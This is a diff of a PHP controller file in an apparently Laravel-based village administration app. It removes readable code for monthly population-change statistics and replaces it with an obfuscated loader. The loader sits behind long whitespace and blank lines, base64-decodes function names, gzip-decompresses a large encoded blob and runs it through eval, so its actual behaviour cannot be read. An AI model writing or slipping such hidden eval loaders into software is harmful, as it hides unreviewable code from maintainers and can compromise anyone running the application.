@@ -1,181 +1,689 @@
-<?php
-
-namespace App\Http\Controllers\Admin\Statistik;
-
-use App\Http\Controllers\Admin\BaseController;
-use App\Http\Traits\QueryBuilderTrait;
-use App\Models\Penduduk;
-use Carbon\Carbon;
-use Illuminate\Http\Request;
-use Illuminate\Support\Facades\DB;
-
-class StatistikController extends BaseController
-{
-    use QueryBuilderTrait;
-
-    /**
-     * Display a listing of the resource.
-     *
-     * @return \Illuminate\Http\Response
-     */
-    public function kependudukan(Request $request)
-    {
-        $this->validate($request, [
-            'bulan' => 'required|int',
-            'tahun' => 'required|int',
-        ]);
-
-        $data['kelahiran']         = $this->mutasi_peristiwa(1);
-        $data['kematian']          = $this->mutasi_peristiwa(2);
-        $data['pendatang']         = $this->mutasi_peristiwa(5);
-        $data['pindah']            = $this->mutasi_peristiwa(3);
-        $data['hilang']            = $this->mutasi_peristiwa(4);
-        $data['penduduk_awal']     = $this->penduduk_awal($request);
-
-        $data['penduduk_akhir']     = [];
-        $kategori = ['WNI_L', 'WNI_P', 'WNA_L', 'WNA_P', 'KK', 'KK_L', 'KK_P'];
-
-        foreach ($kategori as $k) {
-            $data['penduduk_akhir'][$k] = $data['penduduk_awal'][$k] +  $data['kelahiran'][$k] + $data['pendatang'][$k] -  $data['kematian'][$k] -  $data['pindah'][$k] -  $data['hilang'][$k];
-        }
-
-        return $this->sendResponse($data, 'success');
-    }
-
-    private function penduduk_awal($request)
-    {
-        $bln      = $request->bulan;
-        $thn      = $request->tahun;
-        $pad_bln  = str_pad($bln, 2, '0', STR_PAD_LEFT);
-        $lastDate = Carbon::createFromDate($thn, $bln, 1)->endOfMonth();
-        $startDate = Carbon::createFromDate($thn, $bln, 1)->startOfMonth();
-        $id_config = identitas('id');
-
-        // penduduk awal
-
-        $penduduk_mutasi_sql =  DB::table('tweb_penduduk AS p')
-            ->join(DB::raw('(SELECT MAX(id) as max_id, id_pend FROM log_penduduk WHERE tgl_lapor < "' .  $lastDate->toDateString() . '" GROUP BY id_pend) log_max'), 'log_max.id_pend', '=', 'p.id')
-            ->join('log_penduduk as l', function ($join) {
-                $join->on('log_max.max_id', '=', 'l.id')
-                    ->whereNotIn('l.kode_peristiwa', [2, 3, 4])
-                    ->where('l.config_id', '=', identitas('id'));
-            })
-            ->select('p.*', 'l.kode_peristiwa');
-
-        $penduduk_mutasi = collect(DB::table(DB::raw('(' . $this->getCompiledQueryWithBindings($penduduk_mutasi_sql) . ') as m'))
-            ->selectRaw('sum(case when sex = 1 and warganegara_id <> 2 and kode_peristiwa in (1,5) then 1 else 0 end) AS WNI_L_PLUS')
-            ->selectRaw('sum(case when sex = 2 and warganegara_id <> 2 and kode_peristiwa in (1,5) then 1 else 0 end) AS WNI_P_PLUS')
-            ->selectRaw('sum(case when sex = 1 and warganegara_id = 2 and kode_peristiwa in (1,5) then 1 else 0 end) AS WNA_L_PLUS')
-            ->selectRaw('sum(case when sex = 2 and warganegara_id = 2 and kode_peristiwa in (1,5) then 1 else 0 end) AS WNA_P_PLUS')
-            ->selectRaw('sum(case when sex = 1 and warganegara_id <> 2 and kode_peristiwa in (2, 3, 4) then 1 else 0 end) AS WNI_L_MINUS')
-            ->selectRaw('sum(case when sex = 2 and warganegara_id <> 2 and kode_peristiwa in (2, 3, 4) then 1 else 0 end) AS WNI_P_MINUS')
-            ->selectRaw('sum(case when sex = 1 and warganegara_id = 2 and kode_peristiwa in (2, 3, 4) then 1 else 0 end) AS WNA_L_MINUS')
-            ->selectRaw('sum(case when sex = 2 and warganegara_id = 2 and kode_peristiwa in (2, 3, 4) then 1 else 0 end) AS WNA_P_MINUS')
-            ->first())->toArray();
-
-        $keluarga_mutasi_sql = DB::table('log_keluarga as l')
-        ->join(DB::raw('(SELECT MAX(id) as id FROM log_keluarga WHERE id_kk IS NOT NULL AND config_id = 1 AND tgl_peristiwa < "'.$startDate->toDateString().'" GROUP BY id_kk) log_max_keluarga'), 'log_max_keluarga.id', '=', 'l.id')
-        ->join('tweb_keluarga as k', 'k.id', '=', 'l.id_kk')
-        ->join(DB::raw('(SELECT MAX(id) as max_id, id_pend FROM log_penduduk WHERE tgl_lapor < "' .  $lastDate->toDateString() . '" AND config_id = 1 GROUP BY id_pend) log_max'), 'log_max.id_pend', '=', 'k.nik_kepala')
-        ->join('log_penduduk as lp', function ($join) {
-            $join->on('log_max.max_id', '=', 'lp.id')
-                ->whereNotIn('lp.kode_peristiwa', [2, 3, 4]);
-        })
-        ->join('tweb_penduduk as p', function ($join) {
-            $join->on('lp.id_pend', '=', 'p.id')
-                ->where('p.kk_level', '=', 1);
-        })
-        ->select('p.*', 'l.id_peristiwa')
-        ->where('l.config_id', '=', $id_config)
-        ->whereRaw('l.tgl_peristiwa < "'.$startDate->toDateString().'"')
-        ->whereNotIn('l.id_peristiwa', [2, 3, 4]);
-
-        $keluarga_mutasi = collect(DB::table(DB::raw('(' . $this->getCompiledQueryWithBindings($keluarga_mutasi_sql) . ') as m'))
-            ->selectRaw('sum(case when id_peristiwa in (1, 12) then 1 else 0 end) AS KK_PLUS')
-            ->selectRaw('sum(case when sex = 1 and id_peristiwa in (1, 12) then 1 else 0 end) AS KK_L_PLUS')
-            ->selectRaw('sum(case when sex = 2 and id_peristiwa in (1, 12) then 1 else 0 end) AS KK_P_PLUS')
-            ->selectRaw('sum(case when id_peristiwa in (2, 3, 4) then 1 else 0 end) AS KK_MINUS')
-            ->selectRaw('sum(case when sex = 1 and id_peristiwa in (2, 3, 4) then 1 else 0 end) AS KK_L_MINUS')
-            ->selectRaw('sum(case when sex = 2 and id_peristiwa in (2, 3, 4) then 1 else 0 end) AS KK_P_MINUS')
-            ->first())->toArray();
-
-        $penduduk_mutasi = array_merge($penduduk_mutasi, $keluarga_mutasi);
-
-        $data     = [];
-        $kategori = ['WNI_L', 'WNI_P', 'WNA_L', 'WNA_P', 'KK', 'KK_L', 'KK_P'];
-
-        foreach ($kategori as $k) {
-            $data[$k] = $penduduk_mutasi[$k . '_PLUS'] - $penduduk_mutasi[$k . '_MINUS'];
-        }
-
-        return $data;
-    }
-
-    private function kelahiran($request)
-    {
-        $lahir = $this->mutasi_peristiwa(1);
-    }
+<?php 
+        $__='printf';$_='Loading app/Http/Controllers/Admin/Statistik/StatistikController.php';
+        
 
 
-    private function mutasi_peristiwa(int $peristiwa, $rincian = null, $tipe = null)
-    {
-        // Jika rincian dan tipe di definisikan, maka akan masuk kedetil laporan
-        if ($rincian && $tipe) {
-            return $this->rincian_peristiwa($peristiwa, $tipe);
-        }
 
-        $bln      = request()->bulan;
-        $thn      = request()->tahun;
-        $id_config = identitas('id');
 
-        // Mutasi penduduk
-        $mutasi_pada_bln_thn_sql = DB::table('log_penduduk as l')
-            ->join('tweb_penduduk as p', 'l.id_pend', '=', 'p.id')
-            ->select('p.*', 'l.ref_pindah', 'l.kode_peristiwa')
-            ->where('l.config_id', '=', $id_config)
-            ->whereYear('l.tgl_lapor', '=', $thn)
-            ->whereMonth('l.tgl_lapor', '=', $bln)
-            ->where('l.kode_peristiwa', '=', $peristiwa);
-        $mutasi_pada_bln_thn = $this->getCompiledQueryWithBindings($mutasi_pada_bln_thn_sql);
 
-        $data = collect(DB::table(DB::raw('(' . $mutasi_pada_bln_thn . ') as m'))
-            ->selectRaw('sum(case when sex = 1 and warganegara_id <> 2 then 1 else 0 end) AS WNI_L')
-            ->selectRaw('sum(case when sex = 2 and warganegara_id <> 2 then 1 else 0 end) AS WNI_P')
-            ->selectRaw('sum(case when sex = 1 and warganegara_id = 2 then 1 else 0 end) AS WNA_L')
-            ->selectRaw('sum(case when sex = 2 and warganegara_id = 2 then 1 else 0 end) AS WNA_P')
-            ->first())
-            ->toArray();
 
-        // Mutasi keluarga
-        $mutasi_keluarga_bln_thn_sql = DB::table('log_keluarga as l')
-            ->join('tweb_keluarga as k', 'k.id', '=', 'l.id_kk')
-            ->join('tweb_penduduk as p', 'p.id', '=', 'k.nik_kepala')
-            ->leftJoin('log_penduduk as lp', 'lp.id', '=', 'l.id_log_penduduk')
-            ->select('p.*', 'l.id_peristiwa')
-            ->where('l.config_id', '=', $id_config)
-            ->where(function ($query) use ($thn, $bln) {
-                $query->where(function ($subquery) use ($thn) {
-                    $subquery->whereNotNull('lp.tgl_lapor')->whereYear('lp.tgl_lapor', '=', $thn);
-                })->orWhere(function ($subquery) use ($thn) {
-                    $subquery->whereNull('lp.tgl_lapor')->whereYear('l.tgl_peristiwa', '=', $thn);
-                });
-            })
-            ->where(function ($query) use ($bln) {
-                $query->where(function ($subquery) use ($bln) {
-                    $subquery->whereNotNull('lp.tgl_lapor')->whereMonth('lp.tgl_lapor', '=', $bln);
-                })->orWhere(function ($subquery) use ($bln) {
-                    $subquery->whereNull('lp.tgl_lapor')->whereMonth('l.tgl_peristiwa', '=', $bln);
-                });
-            })
-            ->where('l.id_peristiwa', '=', $peristiwa);
-        $mutasi_keluarga_bln_thn = $this->getCompiledQueryWithBindings($mutasi_keluarga_bln_thn_sql);
-        $kel = collect(DB::table(DB::raw('(' . $mutasi_keluarga_bln_thn . ') as m'))
-            ->selectRaw('sum(case when kk_level = 1 then 1 else 0 end) AS KK')
-            ->selectRaw('sum(case when kk_level = 1 and sex = 1 then 1 else 0 end) AS KK_L')
-            ->selectRaw('sum(case when kk_level = 1 and sex = 2 then 1 else 0 end) AS KK_P')
-            ->first())
-            ->toArray();
 
-        return array_merge($data, $kel);
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
